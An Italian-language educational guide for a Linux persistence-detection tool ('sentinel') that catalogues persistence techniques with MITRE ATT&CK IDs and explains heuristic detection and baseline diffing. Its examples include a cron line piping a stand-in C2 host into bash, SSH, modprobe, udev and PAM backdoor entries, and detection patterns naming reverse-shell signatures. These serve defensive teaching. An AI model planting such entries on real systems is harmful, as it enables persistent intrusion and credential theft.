# Concetti fondamentali di sicurezza

Questo documento spiega come funziona la persistenza su Linux, perché gli attaccanti la usano e come gli strumenti di detection la trovano. Non si tratta di definizioni prese da un libro di testo. Esamineremo come si svolgono gli attacchi reali e cosa rende pericolosa ogni posizione di persistenza.

## Persistenza su Linux

### Cos'è

La persistenza è qualsiasi meccanismo che fa sì che il codice dell'attaccante venga eseguito di nuovo dopo un reboot, un logout o un riavvio di servizio. L'exploit iniziale dell'attaccante lo porta dentro. La persistenza tiene la porta aperta.

Linux non ha una lista centrale di "programmi di avvio". Il codice può essere innescato da decine di sottosistemi indipendenti: il sistema di init, la sequenza di login, il dynamic linker, il gestore dei dispositivi, lo scheduler dei job, la shell e lo stack di autenticazione. Ciascuno di essi è una potenziale posizione di persistenza.

### Perché è importante

Senza persistenza, un attaccante perde l'accesso nel momento in cui il processo compromesso muore o il sistema fa il reboot. Con la persistenza, può sopravvivere a reboot, aggiornamenti del kernel, cambi di password e persino a una pulizia parziale di incident response (se chi risponde all'incidente manca una delle molte posizioni).

Il malware Orbit per Linux del 2022 ha dimostrato tutto questo perfettamente. Si installava tramite LD_PRELOAD in /etc/ld.so.preload, il che significava che ogni singolo processo sul sistema caricava la shared library del malware. Agganciava (hook) le funzioni di libc per nascondere i propri file, le connessioni di rete e i processi da strumenti come ls, netstat e ps. Anche se sapevi cosa cercare, il malware era invisibile perché controllava le librerie da cui quegli strumenti dipendono.

### Il ciclo di vita della persistenza

```
Initial Access
    │
    ▼
Privilege Escalation (if needed)
    │
    ▼
Persistence Installation
    │   ┌──────────────────────────────────┐
    ├──▶│ systemd service                  │
    ├──▶│ cron job                         │
    ├──▶│ shell profile injection          │
    ├──▶│ SSH authorized_keys              │
    ├──▶│ LD_PRELOAD hijacking             │
    ├──▶│ kernel module autoload           │
    ├──▶│ udev rule                        │
    ├──▶│ PAM backdoor                     │
    └──▶│ ... 9 more categories            │
        └──────────────────────────────────┘
    │
    ▼
Callback / C2 Connection
    │
    ▼
Lateral Movement / Objectives
```

Gli attaccanti spesso installano più meccanismi di persistenza come ridondanza. Se l'incident response trova e rimuove il cron job, il timer systemd scatta comunque. Se puliscono il timer systemd, l'injection nel profilo di shell viene comunque eseguita al login successivo.

## Categorie di persistenza

### Servizi e timer di systemd (T1543.002, T1053.006)

Systemd è il sistema di init sulla maggior parte delle distribuzioni Linux moderne. Gestisce servizi, timer, socket e device unit. Gli attaccanti creano o modificano i file unit per eseguire comandi arbitrari al boot o secondo una pianificazione.

Un servizio systemd malevolo sembra qualsiasi altro servizio:

```ini
[Unit]
Description=System Health Monitor

[Service]
ExecStart=/usr/local/bin/health-check
Restart=always

[Install]
WantedBy=multi-user.target
```

La differenza sta in ciò che `/usr/local/bin/health-check` fa davvero. Potrebbe essere una reverse shell, un miner di criptovalute o uno script di esfiltrazione dei dati. Il file unit in sé sembra completamente normale.

I timer di systemd sono il moderno sostituto di cron. Offrono una pianificazione basata su calendario e monotonica:

```ini
[Timer]
OnCalendar=*:0/5
Persistent=true
```

Questo scatta ogni 5 minuti e recupera le esecuzioni mancate. Gli attaccanti preferiscono i timer a cron perché i timer si integrano con il sistema di dipendenze e il logging di systemd, rendendoli più difficili da distinguere dai timer di sistema legittimi.

**Cosa controlla sentinel:** le direttive ExecStart/ExecStop/ExecReload alla ricerca di comandi sospetti, file unit scrivibili da tutti (world-writable), unit modificate di recente, override drop-in nelle directory .d e unit .path che scattano in base ai cambiamenti del filesystem.

### Cron job (T1053.003)

Cron è il classico scheduler di job di Unix. Controlla più posizioni:

```
/etc/crontab              System crontab with user field
/etc/cron.d/              Drop-in crontab fragments
/etc/cron.daily/          Scripts run once per day
/etc/cron.hourly/         Scripts run once per hour
/var/spool/cron/crontabs/ Per-user crontabs (crontab -e)
/etc/anacrontab           Anacron for machines not always on
```

Una tipica voce di cron per la persistenza:

```
*/5 * * * * root curl -s http://c2.example.com/update | bash
```

Questo scarica ed esegue uno script ogni 5 minuti. Il pattern `curl | bash` è uno degli indicatori di compromissione con la confidenza più alta perché il software legittimo non lo usa quasi mai nel cron.

**Cosa controlla sentinel:** ogni posizione di cron alla ricerca di corrispondenze di pattern rispetto al motore di detection. Fa il parsing dei campi del crontab per estrarre la parte del comando, controlla i file cron scrivibili da tutti.

### Injection nei profili di shell (T1546.004)

Ogni volta che un utente apre una shell, diversi script di inizializzazione vengono eseguiti in sequenza:

```
Login shell:     /etc/profile → ~/.bash_profile → ~/.bashrc
Non-login shell: /etc/bash.bashrc → ~/.bashrc
Zsh:             /etc/zsh/zshrc → ~/.zshrc
```

Gli attaccanti iniettano comandi in uno qualsiasi di questi file. Il codice iniettato viene eseguito con i privilegi dell'utente ogni volta che effettua il login o apre un terminale:

```bash
export PATH="/tmp/.hidden:$PATH"
```

Questo antepone una directory nascosta al PATH. Qualsiasi comando che l'utente esegue (come `sudo`, `ssh`, `ls`) controllerà prima `/tmp/.hidden` alla ricerca di un binario con quel nome. L'attaccante vi colloca versioni trojanizzate che catturano le credenziali o eseguono payload aggiuntivi prima di chiamare il vero binario.

**Cosa controlla sentinel:** tutti i file RC di shell di sistema e per-utente, gli script /etc/profile.d/. Rileva l'hijacking di alias (`alias sudo=...`), la manipolazione del PATH verso directory temporanee, gli export di LD_PRELOAD, i payload codificati, le invocazioni di strumenti di rete e i lanci di processi in background.

### Persistenza SSH (T1098.004)

I file authorized_keys di SSH supportano opzioni che eseguono comandi al login:

```
command="/tmp/.backdoor" ssh-rsa AAAA...
```

Ogni login SSH con questa chiave esegue `/tmp/.backdoor` prima (o al posto) della shell dell'utente. L'opzione `environment=` può impostare variabili d'ambiente arbitrarie, inclusa LD_PRELOAD.

Gli script `~/.ssh/rc` per-utente vengono eseguiti a ogni login SSH, prima che la shell si avvii. L'`/etc/ssh/sshrc` a livello di sistema fa lo stesso per tutti gli utenti. Queste sono feature legittime che gli attaccanti riutilizzano per altri scopi.

Impostazioni pericolose di sshd_config come `PermitRootLogin yes` e percorsi `AuthorizedKeysFile` non standard sono anch'essi indicatori. Spostare authorized_keys in una posizione inusuale (`/opt/.keys/%u`) rende la backdoor più difficile da trovare durante un'ispezione manuale.

**Cosa controlla sentinel:** authorized_keys per le opzioni command= ed environment=, sshd_config per direttive pericolose, ~/.ssh/rc e /etc/ssh/sshrc per l'esistenza e i contenuti sospetti.

### Hijacking di LD_PRELOAD (T1574.006)

Il dynamic linker carica le shared library prima delle librerie proprie del programma. LD_PRELOAD forza il caricamento per primo di una libreria specifica, permettendole di intercettare (hook) qualsiasi chiamata di funzione.

```
/etc/ld.so.preload
```

Qualsiasi percorso di libreria in questo file viene caricato in ogni processo collegato dinamicamente sul sistema. Questo è il meccanismo di persistenza più potente su Linux perché è invisibile alla maggior parte degli strumenti di detection. Se la libreria malevola aggancia (hook) `readdir()`, `stat()` e `open()`, può nascondere i propri file da ls, find e cat.

Il rootkit Jynx2, il rootkit Azazel e il malware Orbit del 2022 hanno usato tutti questa tecnica. /etc/ld.so.preload non dovrebbe quasi mai contenere voci su un sistema di produzione.

**Cosa controlla sentinel:** le voci di /etc/ld.so.preload (qualsiasi voce è sospetta; le voci che puntano a /tmp o /dev/shm sono critical), /etc/ld.so.conf.d/ per percorsi di librerie in directory temporanee, /etc/environment per export di LD_PRELOAD.

### Autoloading dei moduli del kernel (T1547.006)

I file in /etc/modules-load.d/ elencano i moduli del kernel caricati al boot. I file in /etc/modprobe.d/ possono includere direttive `install` che eseguono comandi di shell quando un modulo viene caricato:

```
install bluetooth /bin/bash -c '/tmp/.payload &'
```

Questo esegue un comando di shell ogni volta che il modulo bluetooth viene caricato. Il campo del comando viene passato a /bin/sh, quindi può contenere codice di shell arbitrario. La maggior parte degli amministratori non verifica le configurazioni di modprobe perché cambiano raramente.

**Cosa controlla sentinel:** modules-load.d per i moduli caricati al boot (livello info), modprobe.d per gli hook install che invocano interpreti di shell o strumenti di rete.

### Regole udev (T1546)

Udev gestisce gli eventi dei dispositivi. Le regole in /etc/udev/rules.d/ possono innescare comandi quando viene collegato dell'hardware, quando le interfacce di rete si attivano o quando compaiono dispositivi a blocchi:

```
ACTION=="add", SUBSYSTEM=="usb", RUN+="/tmp/.backdoor"
```

Questo esegue uno script ogni volta che viene connesso un dispositivo USB. All'attaccante basta solo che il target colleghi un dispositivo USB (o che il sistema ne rilevi uno virtuale).

**Cosa controlla sentinel:** le direttive RUN+= alla ricerca di comandi sospetti, interpreti di shell, percorsi di directory temporanee e corrispondenze del motore di pattern.

### Backdoor PAM (T1556.003)

I Pluggable Authentication Modules (PAM) controllano come Linux autentica gli utenti. I file di configurazione PAM in /etc/pam.d/ definiscono uno stack di moduli per ogni servizio (login, sshd, sudo).

Due tecniche di persistenza basate su PAM:

1. **pam_exec.so** esegue uno script esterno durante l'autenticazione:
```
auth optional pam_exec.so /tmp/.keylogger
```
Questo cattura le credenziali mentre gli utenti si autenticano.

2. **pam_permit.so** nello stack auth accetta qualsiasi credenziale:
```
auth sufficient pam_permit.so
```
Questo permette il login con qualsiasi password. Gli attaccanti lo inseriscono prima del vero modulo di autenticazione.

**Cosa controlla sentinel:** le voci pam_exec.so (severità elevata quando puntano a directory temporanee o strumenti di rete), pam_permit.so nel contesto auth.

### Categorie aggiuntive

**Script init.d (T1037.004):** script legacy SysV init in /etc/init.d/ e /etc/rc.local. Ancora presenti ed eseguiti su molti sistemi per retrocompatibilità.

**XDG Autostart (T1547.013):** file desktop .desktop in /etc/xdg/autostart/ e ~/.config/autostart/ che lanciano applicazioni al login grafico. Il campo Exec= può contenere comandi arbitrari.

**Job at (T1053.001):** job pianificati una tantum in /var/spool/at/. Meno comuni del cron ma spesso trascurati durante l'incident response.

**Script MOTD (T1546):** gli script in /etc/update-motd.d/ vengono eseguiti come root ogni volta che un utente effettua il login per generare il message of the day.

**Hook di logrotate (T1053.003):** le configurazioni di logrotate possono includere blocchi postrotate/prerotate/firstaction/lastaction che eseguono comandi di shell quando i log vengono ruotati. Questi vengono eseguiti come root secondo una pianificazione.

**Generatori systemd (T1543.002):** gli eseguibili in /etc/systemd/system-generators/ e nelle directory equivalenti vengono eseguiti presto nel processo di boot per creare dinamicamente i file unit. Vengono eseguiti prima che la maggior parte dei servizi si avvii.

**Bash completion (T1546.004):** gli script in /etc/bash_completion.d/ e ~/.bash_completion vengono importati (source) in ogni sessione interattiva di shell. Il codice iniettato viene eseguito ogni volta che un utente apre un terminale.

**Hook delle interfacce di rete (T1546):** gli script in /etc/NetworkManager/dispatcher.d/ e /etc/network/if-up.d/ vengono eseguiti quando le interfacce di rete cambiano stato. Vengono eseguiti come root.

## Il framework MITRE ATT&CK

### Cos'è

MITRE ATT&CK è una knowledge base di tattiche e tecniche degli avversari basata su osservazioni del mondo reale. Ogni tecnica ha un ID (come T1543.002) che la identifica univocamente in tutto il settore della cybersecurity.

Il framework organizza le tecniche in tattiche (il "perché") e tecniche (il "come"):

```
Tactic: Persistence (TA0003)
├── T1543.002  Create or Modify System Process: Systemd Service
├── T1053.003  Scheduled Task/Job: Cron
├── T1546.004  Event Triggered Execution: Unix Shell Configuration
├── T1098.004  Account Manipulation: SSH Authorized Keys
├── T1574.006  Hijack Execution Flow: Dynamic Linker Hijacking
├── T1547.006  Boot or Logon Autostart: Kernel Modules
├── T1546      Event Triggered Execution
├── T1037.004  Boot or Logon Initialization: RC Scripts
├── T1547.013  Boot or Logon Autostart: XDG Autostart
├── T1053.001  Scheduled Task/Job: At
├── T1556.003  Modify Authentication Process: PAM
└── T1053.006  Scheduled Task/Job: Systemd Timers
```

### Perché è importante per la detection engineering

Etichettare i finding con gli ID MITRE serve a tre scopi:

1. **Comunicazione:** i team di sicurezza usano gli ID delle tecniche come vocabolario condiviso. "Abbiamo trovato T1574.006" viene compreso immediatamente tra le organizzazioni
2. **Mappatura della copertura:** le organizzazioni possono mappare le proprie capacità di detection rispetto alla matrice ATT&CK per identificare i punti ciechi
3. **Correlazione della threat intelligence:** se la threat intelligence dice che APT29 usa T1053.003 e T1546.004, i difensori possono dare priorità alla detection per quelle tecniche

## Detection euristica

### Analisi basata su pattern

Sentinel non si limita a controllare se i file esistono. Analizza il loro contenuto usando espressioni regolari compilate che corrispondono a pattern noti come malevoli. I pattern sono ordinati per severità:

**I pattern critical** indicano una compromissione quasi certa:
- Firme di reverse shell: `/dev/tcp/`, mkfifo+nc, socat+exec, connessioni socket di python/perl/ruby
- Manipolazione di LD_PRELOAD nei file di configurazione
- Manipolazione del bit SUID: chmod +s, chmod 4755

**I pattern high** indicano una probabile attività malevola:
- Catene di download-and-execute: `curl ... | bash`, `wget -O /tmp/`
- Payload codificati/offuscati: decodifica base64 reindirizzata (pipe) all'esecuzione
- Hijacking di alias: ridefinire sudo, ssh, passwd con versioni trojanizzate
- Manipolazione del PATH verso directory temporanee
- Comandi di creazione account in posti in cui non dovrebbero comparire

**I pattern medium** sono sospetti ma potrebbero essere legittimi:
- Invocazioni di strumenti di rete (curl, wget, nc) negli script di avvio
- Esecuzione di script inline (python -c, perl -e)
- Riferimenti a directory temporanee in posizioni persistenti
- Lanci di processi in background con nohup/disown

### Perché euristiche invece di firme

La detection basata su firme corrisponde a stringhe note-come-dannose esatte (come specifici hash di malware). La detection euristica corrisponde a pattern comportamentali. Un attaccante può cambiare il proprio dominio C2 ogni ora, ma ha comunque bisogno di `curl` per scaricare e di `bash` per eseguire. Può riscrivere la propria reverse shell in qualsiasi linguaggio, ma deve comunque aprire un socket di rete e reindirizzare stdin/stdout.

Il compromesso: le euristiche producono più falsi positivi delle firme. Un cron job legittimo che usa curl per controllare un endpoint di health innescherà il pattern degli strumenti di rete. Ecco perché sentinel usa i livelli di severità e il meccanismo della ignore-list: fai la baseline del sistema, sopprimi i finding known-good e ti concentri sulle anomalie.

## Baseline diffing

### Il problema

Un server Linux di produzione potrebbe avere 50+ servizi systemd legittimi, decine di cron job e varie personalizzazioni dei profili di shell. Riportare tutti questi come finding crea un rumore schiacciante che rende invisibili le minacce reali.

### La soluzione

Il baseline diffing funziona in due fasi:

1. **Fase di save:** scansiona il sistema in uno stato known-good. Salva tutti i finding come snapshot JSON
2. **Fase di diff:** scansiona di nuovo più tardi. Confronta con la baseline. Riporta solo i finding che sono nuovi

Il confronto usa una chiave composita di `scanner|path|title` per far corrispondere i finding tra le scansioni. Se lo stesso servizio systemd ha prodotto lo stesso finding sia nella baseline sia nella scansione corrente, viene soppresso. Se un nuovo cron job è comparso dopo la baseline, viene riportato.

Questo è lo stesso concetto alla base degli strumenti di file integrity monitoring come OSSEC e AIDE, applicato specificamente ai meccanismi di persistenza.

## Metti alla prova la tua comprensione

Prima di passare all'architettura, assicurati di saper rispondere:

1. Perché un attaccante installerebbe più meccanismi di persistenza sullo stesso sistema?
2. Cosa rende LD_PRELOAD più pericoloso di un cron job come meccanismo di persistenza?
3. Perché sentinel segnala `curl` in un cron job come severità medium invece di marcarlo immediatamente come critical?

## Approfondimenti

**Essenziali:**
- [MITRE ATT&CK Persistence Tactic](https://attack.mitre.org/tactics/TA0003/) - Il riferimento autorevole per ogni tecnica che sentinel rileva
- [The Orbit Linux Malware Analysis](https://www.intezer.com/blog/research/orbit-new-undetected-linux-threat/) - L'analisi di Intezer sull'evasione dei rootkit basati su LD_PRELOAD

**Approfondimenti tecnici:**
- [Linux Persistence Techniques](https://hadess.io/the-art-of-linux-persistence/) - Catalogo completo delle posizioni di persistenza
- [systemd.exec(5)](https://www.freedesktop.org/software/systemd/man/systemd.exec.html) - Ogni direttiva di cui sentinel fa il parsing nelle unit systemd
